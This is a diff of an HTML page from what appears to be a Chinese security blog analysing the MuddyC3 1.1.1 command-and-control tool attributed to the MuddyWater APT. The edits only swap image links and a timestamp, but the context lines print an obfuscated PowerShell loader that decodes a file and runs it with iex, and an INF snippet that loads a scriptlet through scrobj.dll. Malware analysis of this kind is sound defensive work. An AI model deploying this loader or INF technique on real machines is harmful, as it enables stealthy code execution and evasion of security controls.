@@ -61,7 +61,7 @@
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/25.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/27.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/28.png">
-<meta property="og:image" content="www.ggsec.cn/img/7.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/31.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/15.png">
@@ -73,7 +73,7 @@
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/23.png">
 <meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2.png">
-<meta property="og:updated_time" content="2020-07-30T10:07:10.573Z">
+<meta property="og:updated_time" content="2020-07-30T11:57:32.828Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="APT污水攻击MuddyC3 1.1.1版本浅析">
 <meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1.png">
@@ -515,7 +515,7 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=(<span class="built_in">get-content</span> C:\\ProgramData\\a.zip);<span class="variable">$d</span> = @();<span class="variable">$v</span> = <span class="number">0</span>;<span class="variable">$c</span> = <span class="number">0</span>;<span class="keyword">while</span>(<span class="variable">$c</span> <span class="nomarkup">-ne</span> <span class="variable">$s</span>.length)&#123;<span class="variable">$v</span>=(<span class="variable">$v</span>*<span class="number">52</span>)+([Int32][char]<span class="variable">$s</span>[<span class="variable">$c</span>]-<span class="number">40</span>);<span class="keyword">if</span>(((<span class="variable">$c</span>+<span class="number">1</span>)%<span class="number">3</span>) <span class="nomarkup">-eq</span> <span class="number">0</span>)&#123;<span class="keyword">while</span>(<span class="variable">$v</span> <span class="nomarkup">-ne</span> <span class="number">0</span>)&#123;<span class="variable">$vv</span>=<span class="variable">$v</span>%<span class="number">256</span>;<span class="keyword">if</span>(<span class="variable">$vv</span> <span class="nomarkup">-gt</span> <span class="number">0</span>)&#123;<span class="variable">$d</span>+=[char][Int32]<span class="variable">$vv</span>&#125;<span class="variable">$v</span>=[Int32](<span class="variable">$v</span>/<span class="number">256</span>)&#125;&#125;<span class="variable">$c</span>+=<span class="number">1</span>;&#125;;[array]::Reverse(<span class="variable">$d</span>);iex([String]::Join(<span class="string">''</span>,<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"></span><br><span class="line"><span class="section">[Excel]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=EventManager</span><br><span class="line"></span><br><span class="line"><span class="section">[EventManager]</span></span><br><span class="line">%11%\scrobj.dll,NI,c:/programdata/sct.zip</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">"SOFTWARE\Microsoft\Connection Manager"</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">" "</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">" "</span></span><br></pre></td></tr></table></figure>
 <h3 id="1-2参数分析"><a href="#1-2参数分析" class="headerlink" title="1.2参数分析"></a>1.2参数分析</h3><p>通过分析core文件夹下cmd.py文件</p>
-<p><img src="img/7.png" alt="7"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7.png" alt="enter description here"></p>
 <p>得出AGENTS字典中每个元素的结构如下：</p>
 <table>
 <thead>
